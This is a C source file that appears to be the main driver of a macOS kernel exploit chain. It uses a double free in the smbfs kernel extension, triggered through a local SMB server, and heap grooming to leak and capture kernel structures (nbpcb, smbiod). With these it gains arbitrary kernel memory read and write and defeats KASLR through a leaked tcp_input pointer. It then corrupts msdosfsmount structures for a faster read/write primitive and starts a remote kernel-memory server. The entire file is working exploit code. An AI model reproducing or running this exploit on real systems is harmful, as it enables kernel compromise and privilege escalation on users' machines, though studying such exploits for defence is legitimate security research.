//
//  main.c
//  kmem_xepg
//
//  Created by admin on 12/18/21.
//

#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

#include <libproc.h>
#include <dispatch/dispatch.h>

#include <sys/errno.h>
#include <arpa/inet.h>

#include <xe/memory/kmem.h>
#include <xe/memory/kmem_remote.h>
#include <xe/util/ptrauth.h>
#include <xe/util/assert.h>
#include <xe/slider/kernel.h>
#include <xe/slider/kext.h>
#include <xe/xnu/proc.h>
#include <xe/allocator/msdosfs.h>
#include <xe/memory/kmem_msdosfs.h>
#include <xe/util/binary.h>
#include <xe/util/log.h>

#include "external/smbfs/smb_trantcp.h"
#include "smb/params.h"
#include "smb/client.h"
#include "macos_params.h"

#include "kmem_smbiod.h"
#include "kmem/zkext_free.h"
#include "kmem/zkext_alloc_small.h"
#include "kmem/allocator_rw.h"
#include "kmem/zkext_prime_util.h"



#define NUM_SMB_SERVER_PORTS 64
#define SMB_PORT_FOR_INDEX(base_addr, index, count) (ntohs((base_addr)->sin_port) + (index / ((count + NUM_SMB_SERVER_PORTS - 1) / NUM_SMB_SERVER_PORTS)))


int find_server_pid(void) {
    int num_pids = proc_listpids(PROC_UID_ONLY, getuid(), NULL, 0) / sizeof(int);
    xe_assert(num_pids > 0);
    
    int pids[num_pids];
    bzero(pids, sizeof(pids));
    proc_listpids(PROC_UID_ONLY, getuid(), pids, (int)sizeof(pids));
    
    for (int i=num_pids-1; i>=0; i--) {
        if (pids[i] == 0) {
            continue;
        }
        
        char name[NAME_MAX];
        proc_name(pids[i], name, sizeof(name));
        
        if (strncmp(name, "xepg_smbserver", sizeof(name)) == 0) {
            return pids[i];
        }
    }
    
    xe_log_error("smb_server process not found");
    abort();
}

ushort find_lport_for_fport(int server_pid, ushort fport) {
    xe_assert(fport != 0);
    
    int num_fds = proc_pidinfo(server_pid, PROC_PIDLISTFDS, 0, NULL, 0) / sizeof(struct proc_fdinfo);
    xe_assert(num_fds > 0);
    
    int infos_size = sizeof(struct proc_fdinfo) * num_fds;
    struct proc_fdinfo* infos = malloc(infos_size);
    proc_pidinfo(server_pid, PROC_PIDLISTFDS, 0, infos, infos_size);
    
    for (int i=0; i<num_fds; i++) {
        struct proc_fdinfo* info = &infos[i];
        if (info->proc_fdtype != PROX_FDTYPE_SOCKET) {
            continue;
        }
        
        struct socket_fdinfo sock_info;
        int nb = proc_pidfdinfo(server_pid, info->proc_fd, PROC_PIDFDSOCKETINFO, &sock_info, sizeof(sock_info));
        xe_assert(nb > 0);
        
        ushort sock_fport = ntohs(sock_info.psi.soi_proto.pri_in.insi_fport);
        if (sock_fport == fport) {
            return ntohs(sock_info.psi.soi_proto.pri_in.insi_lport);
        }
    }
    
    xe_log_error("failed to match fport on server");
    abort();
}


void patch_smb_iod(xe_slider_kext_t smbfs_slider, uintptr_t iod) {
    uintptr_t gss = KMEM_OFFSET(iod, offsetof(struct smbiod, iod_gss));
    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn_len)), 0);
    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_spn)), 0);
    xe_kmem_write_uint32(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn_len)), 0);
    xe_kmem_write_uint64(KMEM_OFFSET(gss, offsetof(struct smb_gss, gss_cpn)), 0);
}


void patch_session_interface_table(xe_slider_kext_t smbfs_slider, uintptr_t table) {
    xe_kmem_write_uint32(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_COUNT_OFFSET), 0);
    xe_kmem_write_uint64(KMEM_OFFSET(table, XE_SMB_TYPE_SESSION_INTERFACE_INFO_MEM_CLIENT_NIC_INFO_LIST_OFFSET), 0);
}


void patch_smb_session(xe_slider_kext_t smbfs_slider, uintptr_t session) {
    uintptr_t iod = xe_kmem_read_uint64(KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_IOD_OFFSET));
    if (iod) {
        patch_smb_iod(smbfs_slider, iod);
    }
    uintptr_t session_interface_table = KMEM_OFFSET(session, XE_SMB_TYPE_SMB_SESSION_MEM_SESSION_INTERFACE_TABLE_OFFSET);
    patch_session_interface_table(smbfs_slider, session_interface_table);
}


void patch_smb_sessions(xe_slider_kext_t smbfs_slider) {
    uintptr_t smb_session_list = xe_slider_kext_slide(smbfs_slider, XE_KEXT_SEGMENT_DATA, XE_SMB_VAR_SMB_SESSION_LIST_OFFSET_DATA);
    uintptr_t cursor = xe_kmem_read_uint64(KMEM_OFFSET(smb_session_list, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_CHILDREN_OFFSET));
    while (cursor != 0) {
        xe_assert(XE_VM_KERNEL_ADDRESS_VALID(cursor));
        patch_smb_session(smbfs_slider, cursor);
        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, XE_SMB_TYPE_SMB_CONNOBJ_MEM_CO_NEXT_OFFSET));
    }
}


int main(void) {
    smb_client_load_kext();
    xe_allocator_msdosfs_loadkext();
    
    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    xe_assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    xe_assert(res == 0);

    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(8090);
    inet_aton("127.0.0.1", &smb_addr.sin_addr);
    
    int error = 0;
    int xepg_smbserver_pid = find_server_pid();
    xe_log_info("found xepg_smbserver at pid: %d", xepg_smbserver_pid);
    
    kmem_neighbor_reader_t neighbor_reader = kmem_neighbor_reader_create(&smb_addr);
    
    xe_log_info("start leaking struct nbpbc");
    kmem_zkext_free_session_t nbpcb_free_session = kmem_zkext_free_session_create(&smb_addr);
    struct complete_nic_info_entry double_free_nic = kmem_zkext_free_session_prepare(nbpcb_free_session);
    xe_assert(double_free_nic.possible_connections.tqh_first == NULL);
    xe_log_debug("leaked struct complete_nic_info_entry with nic_index %llu for double free", double_free_nic.nic_index);
    
    struct complete_nic_info_entry* fake_nic = alloca(256 - 8 - 1);
    bzero(fake_nic, 256 - 8 - 1);
    fake_nic->next.next = NULL;
    fake_nic->next.prev = (void*)((uintptr_t)double_free_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
    
    struct kmem_zkext_alloc_small_entry kext_256_element = kmem_zkext_alloc_small(&smb_addr, neighbor_reader, (char*)fake_nic + 8, 256 - 8 - 1);
    xe_log_debug("allocated kext.256 element with fake complete_nic_info_entry at %p", (void*)kext_256_element.address);
    
    double_free_nic.next.next = (void*)kext_256_element.address;
    double_free_nic.addr_list.tqh_first = NULL;
    
    uint num_nbpcb_rw_capture_allocations = 512;
    kmem_allocator_rw_t nbpcb_rw_capture_allocator = kmem_allocator_rw_create(&smb_addr, num_nbpcb_rw_capture_allocations / 2);
    
    uint num_nbpcb_capture_allocations = 256;
    int* nbpcb_capture_allocators = alloca(sizeof(int) * num_nbpcb_capture_allocations);
    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        nbpcb_capture_allocators[index] = smb_client_open_dev();
    });
    
    kmem_zkext_prime_util_t pre_allocator = kmem_zkext_prime_util_create(&smb_addr);
    kmem_zkext_prime_util_prime(pre_allocator, 128, 255);
    
    xe_log_debug("begin free of allocated kext.256 element retaining read reference");
    kmem_zkext_free_session_execute(nbpcb_free_session, &double_free_nic);
    
    char* data = alloca(256);
    memset(data, 0xff, 256);
    error = kmem_allocator_rw_allocate(nbpcb_rw_capture_allocator, num_nbpcb_rw_capture_allocations / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = data;
        *data1_size = 256;
        *data2 = data;
        *data2_size = 256;
    }, NULL);
    xe_assert_err(error);
    
    int64_t found_index = -1;
    error = kmem_allocator_prpw_filter(kext_256_element.element_allocator, 0, kmem_allocator_prpw_get_capacity(kext_256_element.element_allocator), ^bool(void* ctx, sa_family_t family, size_t index) {
        return family == 0xff;
    }, NULL, &found_index);
    xe_assert_err(error);
    xe_assert(found_index >= 0);
    xe_log_debug("done free of allocated kext.256 element while retaining read reference");
    
    xe_log_debug("begin capturing freed kext.256 element with struct nbpcb");
    error = kmem_allocator_prpw_release_containing_backend(kext_256_element.element_allocator, found_index);
    xe_assert_err(error);
    
    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        struct sockaddr_in addr = smb_addr;
        addr.sin_port = htons(SMB_PORT_FOR_INDEX(&smb_addr, index, num_nbpcb_capture_allocations));
        int error = smb_client_ioc_negotiate(nbpcb_capture_allocators[index], &addr, sizeof(addr), FALSE);
        xe_assert_err(error);
    });
    
    found_index = -1;
    struct nbpcb* leaked_nbpcb = alloca(sizeof(struct nbpcb));
    error = kmem_allocator_rw_filter(nbpcb_rw_capture_allocator, 0, num_nbpcb_rw_capture_allocations / 2, 256, 256, ^bool(void* ctx, char* data1, char* data2, size_t index) {
        if (memcmp(data, data1, 256)) {
            memcpy(leaked_nbpcb, data1, sizeof(*leaked_nbpcb));
            return TRUE;
        }
        
        if (memcmp(data, data2, 256)) {
            memcpy(leaked_nbpcb, data2, sizeof(*leaked_nbpcb));
            return TRUE;
        }
        
        return FALSE;
    }, NULL, &found_index);
    xe_assert_err(error);
    xe_assert(found_index >= 0);
    xe_assert_kaddr((uintptr_t)leaked_nbpcb->nbp_iod);
    
    struct sockaddr_in* nbpcb_addr = (struct sockaddr_in*)&leaked_nbpcb->nbp_sock_addr;
    uint16_t nbpcb_fport = ntohs(nbpcb_addr->sin_port);
    uint16_t nbpcb_lport = find_lport_for_fport(xepg_smbserver_pid, nbpcb_fport);
    
    xe_log_debug("done capturing freed kext.256 element with nbpcb");
    xe_log_info("leaked npbcb with smbiod: %p, lport: %d and fport: %d", (void*)leaked_nbpcb->nbp_iod, nbpcb_lport, nbpcb_fport);
    
    kmem_allocator_rw_disown_backend(nbpcb_rw_capture_allocator, (int)found_index);
    
    error = kmem_allocator_rw_destroy(&nbpcb_rw_capture_allocator);
    xe_assert_err(error);
    error = kmem_allocator_prpw_destroy(&kext_256_element.element_allocator);
    xe_assert_err(error);
    
    xe_log_info("begin capturing struct smbiod for read write");
    int num_smbiod_rw_capture_allocations = 512;
    kmem_allocator_rw_t smbiod_rw_capture_allocators = kmem_allocator_rw_create(&smb_addr, num_smbiod_rw_capture_allocations / 2);
    kmem_zkext_free_session_t smbiod_free_session = kmem_zkext_free_session_create(&smb_addr);
    double_free_nic = kmem_zkext_free_session_prepare(smbiod_free_session);
    xe_assert(double_free_nic.possible_connections.tqh_first == NULL);
    xe_log_debug("leaked struct complete_nic_info_entry with nic_index %llu for double free", double_free_nic.nic_index);
    
    fake_nic = alloca(sizeof(struct smbiod));
    bzero(fake_nic, sizeof(struct smbiod));
    fake_nic->next.prev = (void*)((uintptr_t)double_free_nic.possible_connections.tqh_last - offsetof(struct complete_nic_info_entry, possible_connections)) + offsetof(struct complete_nic_info_entry, next);
    double_free_nic.next.next = (void*)leaked_nbpcb->nbp_iod;
    double_free_nic.addr_list.tqh_first = NULL;
    
    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        uint16_t port = SMB_PORT_FOR_INDEX(&smb_addr, index, num_nbpcb_capture_allocations);
        if (nbpcb_lport == port) {
            close(nbpcb_capture_allocators[index]);
            nbpcb_capture_allocators[index] = -1;
        }
    });
    
    error = kmem_allocator_rw_allocate(smbiod_rw_capture_allocators, num_smbiod_rw_capture_allocations / 2, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
        *data1 = (char*)fake_nic;
        *data1_size = sizeof(struct smbiod);
        *data2 = (char*)fake_nic;
        *data2_size = sizeof(struct smbiod);
    }, NULL);
    xe_assert_err(error);
    
    dispatch_apply(num_nbpcb_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (nbpcb_capture_allocators[index] >= 0) {
            close(nbpcb_capture_allocators[index]);
        }
    });
    
    int num_smbiod_capture_allocations = 256;
    int* smbiod_capture_allocators = alloca(sizeof(int) * num_smbiod_capture_allocations);
    dispatch_apply(num_smbiod_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        smbiod_capture_allocators[index] = smb_client_open_dev();
        xe_assert_cond(smbiod_capture_allocators[index], >=, 0);
    });
    
    kmem_zkext_free_session_execute(smbiod_free_session, &double_free_nic);
    
    dispatch_apply(num_smbiod_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        int error = smb_client_ioc_negotiate(smbiod_capture_allocators[index], &smb_addr, sizeof(smb_addr), FALSE);
        xe_assert_err(error);
    });
    
    found_index = -1;
    struct smbiod* leaked_smbiod = alloca(sizeof(struct smbiod));
    error = kmem_allocator_rw_filter(smbiod_rw_capture_allocators, 0, num_smbiod_rw_capture_allocations / 2, sizeof(struct smbiod), sizeof(struct smbiod), ^bool(void* ctx, char* data1, char* data2, size_t index) {
        if (memcmp(data1, fake_nic, sizeof(struct smbiod))) {
            memcpy(leaked_smbiod, data1, sizeof(struct smbiod));
            return TRUE;
        }
        
        if (memcmp(data2, fake_nic, sizeof(struct smbiod))) {
            memcpy(leaked_smbiod, data2, sizeof(struct smbiod));
            return TRUE;
        }
        
        return FALSE;
    }, NULL, &found_index);
    xe_assert_err(error);
    xe_assert(found_index >= 0);
    xe_assert(XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)leaked_smbiod->iod_tdesc));
    xe_log_info("captured smbiod with tdesc %p", leaked_smbiod->iod_tdesc);
    
    int fd_smbiod_rw = kmem_allocator_rw_disown_backend(smbiod_rw_capture_allocators, (int)found_index);
    kmem_allocator_rw_destroy(&smbiod_rw_capture_allocators);
    xe_log_debug("smbiod read write captured by fd: %d", fd_smbiod_rw);
    
    int* fd_smbiod = alloca(sizeof(int));
    *fd_smbiod = -1;
    dispatch_apply(num_smbiod_capture_allocations, DISPATCH_APPLY_AUTO, ^(size_t index) {
        struct smbioc_multichannel_properties props;
        bzero(&props, sizeof(props));
        int error = smb_client_ioc_multichannel_properties(smbiod_capture_allocators[index], &props);
        xe_assert_err(error);
        if (props.iod_properties[0].iod_prop_id == leaked_smbiod->iod_id) {
            *fd_smbiod = smbiod_capture_allocators[index];
        } else {
            close(smbiod_capture_allocators[index]);
            smbiod_capture_allocators[index] = -1;
        }
    });
    xe_assert(*fd_smbiod >= 0);
    xe_log_debug("captured smbiod owned by smb dev at fd: %d", *fd_smbiod);
    xe_log_info("done capturing smbiod for read write");
    
    kmem_smbiod_rw_t smbiod_rw = kmem_smbiod_rw_create(&smb_addr, fd_smbiod_rw, *fd_smbiod);
    xe_kmem_use_backend(xe_kmem_smbiod_create(smbiod_rw));
    xe_log_info("kmem reader using smbiod created");
    
    xe_log_info("begin initializing kernel address slider");
    struct nbpcb nbpcb;
    xe_kmem_read(&nbpcb, (uintptr_t)leaked_smbiod->iod_tdata, sizeof(nbpcb));
    uintptr_t socket = (uintptr_t)nbpcb.nbp_tso;
    uintptr_t protosw = xe_kmem_read_uint64(KMEM_OFFSET(socket, TYPE_SOCKET_MEM_SO_PROTO_OFFSET));
    uintptr_t tcp_input = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(protosw, TYPE_PROTOSW_MEM_PR_INPUT_OFFSET)));
    xe_log_debug("found tcp_input function address: %p", (void*)tcp_input);
    
    int64_t text_exec_slide = tcp_input - FUNC_TCP_INPUT_ADDR;
    xe_log_debug("calculated text_exec slide: %p", (void*)text_exec_slide);
    
    int64_t text_slide = text_exec_slide + XE_IMAGE_SEGMENT_DATA_CONST_SIZE;
    xe_log_debug("calculated text_slide: %p", (void*)text_slide);
    
    uintptr_t mh_execute_header = VAR_MH_EXECUTE_HEADER_ADDR + text_slide;
    xe_log_debug("calculated mh_execute_header address: %p", (void*)mh_execute_header);
    
    xe_slider_kernel_init(mh_execute_header);
    xe_assert(xe_slider_kernel_slide(FUNC_TCP_INPUT_ADDR) == tcp_input);
    xe_log_info("done initializing kernel address slider");
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    xe_log_debug("current proc address: %p\n", (void*)proc);
    
    xe_log_info("begin initializing fast kmem reader using msdosfsmount");
    
    xe_allocator_msdosfs_t decoy_allocator;
    error = xe_allocator_msdosfs_create("decoy", &decoy_allocator);
    xe_assert_err(error);
    
    xe_allocator_msdosfs_t worker_allocator;
    error = xe_allocator_msdosfs_create("worker", &worker_allocator);
    xe_assert_err(error);
    
    xe_allocator_msdosfs_t helper_allocator;
    error = xe_allocator_msdosfs_create("helper", &helper_allocator);
    xe_assert_err(error);
    
    int fd_mount_decoy = xe_allocator_msdsofs_get_mount_fd(decoy_allocator);
    int fd_mount_worker = xe_allocator_msdsofs_get_mount_fd(worker_allocator);
    int fd_mount_helper = xe_allocator_msdsofs_get_mount_fd(helper_allocator);
    
    char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
    xe_assert(mkdtemp(temp_dir) != NULL);
    
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/worker_bridge", temp_dir);
    int worker_bridge_fd = open(path, O_CREAT | O_RDWR);
    xe_assert(worker_bridge_fd >= 0);
    
    snprintf(path, sizeof(path), "%s/helper_bridge", temp_dir);
    int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
    xe_assert(helper_bridge_fd >= 0);
    
    uint32_t fdesc_nfiles;
    uintptr_t fdesc_ofiles = xe_xnu_proc_read_fdesc_ofiles(proc, &fdesc_nfiles);
    xe_log_debug("proc fdesc_ofiles: %p and fdesc_nfiles: %d", (void*)fdesc_ofiles, fdesc_nfiles);
    
    xe_assert_cond(fd_mount_worker, <, fdesc_nfiles);
    uintptr_t vnode_mount_worker = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, fd_mount_worker);
    xe_log_debug("vnode mount worker address: %p", (void*)vnode_mount_worker);
    
    xe_assert_cond(fd_mount_helper, <, fdesc_nfiles);
    uintptr_t vnode_mount_helper = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, fd_mount_helper);
    xe_log_debug("vnode mount helper address: %p", (void*)vnode_mount_helper);
    
    uintptr_t mount_worker = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_worker, TYPE_VNODE_MEM_VN_UN_OFFSET)));
    xe_log_debug("mount worker address: %p", (void*)mount_worker);
    
    uintptr_t mount_helper = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_helper, TYPE_VNODE_MEM_VN_UN_OFFSET)));
    xe_log_debug("mount helper address: %p", (void*)mount_helper);
    
    uintptr_t msdosfs_worker = xe_kmem_read_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
    xe_log_debug("msdosfsmount worker address: %p", (void*)msdosfs_worker);
    
    uintptr_t msdosfs_helper = xe_kmem_read_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
    xe_log_debug("msdosfsmount helper address: %p", (void*)msdosfs_helper);
    
    char backup_worker[368];
    xe_kmem_read(backup_worker, msdosfs_worker, sizeof(backup_worker));
    
    xe_log_debug_hexdump(backup_worker, sizeof(backup_worker), "msdosfsmount worker:");
    
    char backup_helper[368];
    xe_kmem_read(backup_helper, msdosfs_helper, sizeof(backup_helper));
    xe_log_debug_hexdump(backup_helper, sizeof(backup_helper), "msdosfsmount helper:");
    
    uintptr_t vnode_worker_bridge = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, worker_bridge_fd);
    xe_log_debug("vnode worker bridge address: %p", (void*)vnode_worker_bridge);
    
    uintptr_t vnode_helper_bridge = xe_xnu_proc_find_fd_data_from_ofiles(fdesc_ofiles, helper_bridge_fd);
    xe_log_debug("vnode helper bridge address: %p", (void*)vnode_helper_bridge);
    
    struct kmem_msdosfs_init_args args;
    bzero(&args, sizeof(args));
    args.helper_bridge_fd = helper_bridge_fd;
    args.worker_bridge_fd = worker_bridge_fd;
    args.helper_bridge_vnode = vnode_helper_bridge;
    args.worker_bridge_vnode = vnode_worker_bridge;
    memcpy(args.worker_data, backup_worker, sizeof(args.worker_data));
    memcpy(args.helper_data, backup_helper, sizeof(args.helper_data));
    args.helper_msdosfs = msdosfs_helper;
    args.worker_msdosfs = msdosfs_worker;
    xe_allocator_msdosfs_get_mountpoint(worker_allocator, args.worker_mount_point, sizeof(args.worker_mount_point));
    xe_allocator_msdosfs_get_mountpoint(helper_allocator, args.helper_mount_point, sizeof(args.helper_mount_point));
    
    int num_msdosfs_rw_capture_allocators = 256;
    kmem_allocator_rw_t msdosfs_rw_capture_allocators = kmem_allocator_rw_create(&smb_addr, num_msdosfs_rw_capture_allocators);
    args.helper_mutator = ^(void* ctx, char* data) {
        xe_log_debug_hexdump(data, sizeof(args.helper_data), "replacing helper msdosfsmount with data: ");
        struct smbiod iod;
        kmem_smbiod_rw_read_iod(smbiod_rw, &iod);
        iod.iod_gss.gss_cpn = (uint8_t*)msdosfs_helper;
        iod.iod_gss.gss_cpn_len = sizeof(backup_helper);
        kmem_smbiod_rw_write_iod(smbiod_rw, &iod);
        
        char any_data[32];
        int error = smb_client_ioc_ssn_setup(*fd_smbiod, any_data, sizeof(any_data), any_data, sizeof(any_data));
        xe_assert_err(error);
        
        error = kmem_allocator_rw_allocate(msdosfs_rw_capture_allocators, num_msdosfs_rw_capture_allocators, ^(void* ctx, char** data1, uint32_t* data1_size, char** data2, uint32_t* data2_size, size_t index) {
            *data1 = data;
            *data1_size = sizeof(args.helper_data);
            *data2 = data;
            *data2_size = sizeof(args.helper_data);
        }, NULL);
        xe_assert_err(error);
    };
    args.helper_mutator_ctx = NULL;
    
    xe_kmem_use_backend(xe_kmem_msdosfs_create(&args));
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_KERNPROC_ADDR));
    xe_assert_kaddr(kernproc);
    xe_log_info("done initializing fast msdosfsmount based kmem read writer");
    
    xe_log_info("disabling FS ops on helper and worker mounts");
    uintptr_t vnode_mount_decoy;
    error = xe_xnu_proc_find_fd_data(proc, fd_mount_decoy, &vnode_mount_decoy);
    xe_assert_err(error);
    
    uintptr_t mount_decoy = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(vnode_mount_decoy, TYPE_VNODE_MEM_VN_UN_OFFSET)));
    uintptr_t msdosfs_decoy = xe_kmem_read_uint64(KMEM_OFFSET(mount_decoy, TYPE_MOUNT_MEM_MNT_DATA_OFFSET));
    
    xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
    xe_kmem_write_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_decoy);
    xe_log_info("disabled FS ops on helper and worker mounts");
    
    xe_slider_kext_t smbfs_slider = xe_slider_kext_create("com.apple.filesystems.smbfs", XE_KC_BOOT);
    patch_smb_sessions(smbfs_slider);
    kmem_allocator_rw_destroy(&msdosfs_rw_capture_allocators);
    close(*fd_smbiod);
    close(fd_smbiod_rw);
    kmem_smbiod_rw_destroy(&smbiod_rw);
    kmem_zkext_free_session_destroy(&smbiod_free_session);
    kmem_zkext_free_session_destroy(&nbpcb_free_session);
    
    struct xe_kmem_remote_server_ctx server_ctx;
    server_ctx.mh_execute_header = mh_execute_header;
    xe_kmem_remote_server_start(&server_ctx);
    
    xe_log_info("restoring FS ops on helper and worker mounts");
    xe_kmem_write_uint64(KMEM_OFFSET(mount_helper, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_helper);
    xe_kmem_write_uint64(KMEM_OFFSET(mount_worker, TYPE_MOUNT_MEM_MNT_DATA_OFFSET), msdosfs_worker);
    xe_log_info("restored FS ops on helper and worker mounts");
    
    return 0;
}
